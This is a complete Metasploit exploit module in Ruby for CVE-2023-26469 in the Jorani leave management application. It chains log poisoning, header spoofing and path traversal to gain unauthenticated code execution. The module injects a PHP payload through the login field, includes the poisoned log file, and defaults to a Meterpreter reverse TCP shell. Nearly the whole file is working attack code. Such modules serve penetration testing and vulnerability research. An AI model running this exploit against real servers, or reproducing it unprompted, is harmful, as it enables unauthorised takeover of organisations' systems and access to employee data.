##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
        'Name'            => 'Jorani unauthenticated Remote Code Execution',
        'Description'     => %q{
          This module exploits an unauthenticated Remote Code Execution in Jorani.
          It abuses 3 vulnerability, it abuses log poisonning and redirection bypass via header spoofing, then it uses path traversal to trigger the vulnerability.
          It has been tested on Jorani 1.0.0.
        },
        'License'         => MSF_LICENSE,
        'Author'          => 
          [ 
              'RIOUX Guilhem (jrjgjk)' 
          ],
        'References'      => 
          [
            ['CVE', 'CVE-2023-26469'],
            ['URL', 'https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/CVE_Jorani.py' ]
          ],
        'Platform'        => %w[php],
        'Arch'            => ARCH_PHP,
        'Targets'         => 
          [
            ['Jorani <= 1.0.0', {}]
          ],
        'DefaultOptions'  => {
          'PAYLOAD' => 'php/meterpreter/reverse_tcp',
          'RPORT' => 443,
          'SSL'   => true
        },
        'DisclosureDate'  => 'Jan 06 2023',
        'Privileged'      => false,
        'DefaultTarget'   => 0,
        'Notes'           => 
        {
          'Stability'   => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
        }
      )
    )

    register_options(
        [
          OptString.new('TARGETURI', [true, 'The base path of Jorani', '/'])
        ]
      )

  end

  def get_version(res)
    matches = res.body.scan(/&nbsp;v([0-9\.]+)&nbsp;&copy;/i)
    if matches[0].nil?
      print_error("Cannot recovered Jorani version...")
      return nil
    end
    return matches[0][0]
  end

  def isServiceRunning(res)
    matches = res.body.scan(/Leave Management System/)
    if matches[0].nil?
      print_error("Jorani doesn't appears to be running on the target")
      return false
    end
    return true
  end

  def recoverCsrf(res)
    matches = res.body.scan(/<input type="hidden" name="csrf_test_jorani" value="(.*?)"/)
    if matches.length() == 1 and matches[0].length() == 1
      return matches[0][0]
    end
    return ""
  end

  def check
    # For the check command
    print_status("Checking Jorani version")
    uri = normalize_uri(target_uri.path, 'index.php')

    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => "#{uri}/session/login"
    )

    if !isServiceRunning(res)
      return Exploit::CheckCode::Safe
    else
      print_good("Jorani seems to be running on the target !")
    end

    currentVersion = get_version(res)
    if currentVersion.nil?
      return Exploit::CheckCode::Detected
    end
    print_good("Found version: #{currentVersion}")
    currentVersion = Gem::Version.new(currentVersion)

    if currentVersion <= Gem::Version.new('1.0.0')
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    # Main function
    print_status("Trying to exploit LFI")

    pathTravPayload = "../../application/logs"
    headerName = (0...14).map { ('A'..'Z').to_a[rand(26)] }.join
    poisonPayload    = "<?php if(isset($_SERVER['HTTP_" + headerName + "'])){ #{payload.encoded} } ?>"
    logFileName = "log-" + Time.now.strftime("%Y-%m-%d")

    uri = normalize_uri(target_uri.path, 'index.php')

    res = send_request_cgi(
      'method'       => 'GET',
      'keep_cookies' => true,
      'uri'          => "#{uri}/session/login"
    )

    print_status("Recovering CSRF token")
    csrfTok = recoverCsrf(res)
    if csrfTok != ""
      print_good("CSRF found: #{csrfTok}")
    else
      print_status("CSRF not found, doesn't mean its not vulnerable")
    end
    print_status("Poisonning log with payload..")
    print_status("Sending 1st payload")

    res = send_request_cgi(
      'method'       => 'POST',
      'keep_cookies' => true,
      'uri'          => "#{uri}/session/login",
      'data'         => "csrf_test_jorani=#{csrfTok}&last_page=session/login&language=#{pathTravPayload}&login=#{Rex::Text.uri_encode(poisonPayload)}&CipheredValue=DummyPassword"
    )

    print_status("Including poisonned log file #{logFileName}.php")
    print_good("Triggering payload")

    cmdRes = send_request_cgi(
      'method'       => 'GET',
      'keep_cookies' => true,
      'uri'          => "#{uri}/pages/view/#{logFileName}",
      'headers'      =>
      {
            'X-REQUESTED-WITH' => 'XMLHttpRequest',
            headerName         => "MSFExploit"
      }
    )

    if !cmdRes.nil? and cmdRes.body.scan(/Invalid login id or password for user/).length() > 0
      print_good("Exploit worked !!")
    else
      print_error("It seems that exploit failed..")
    end

    return

  end

end
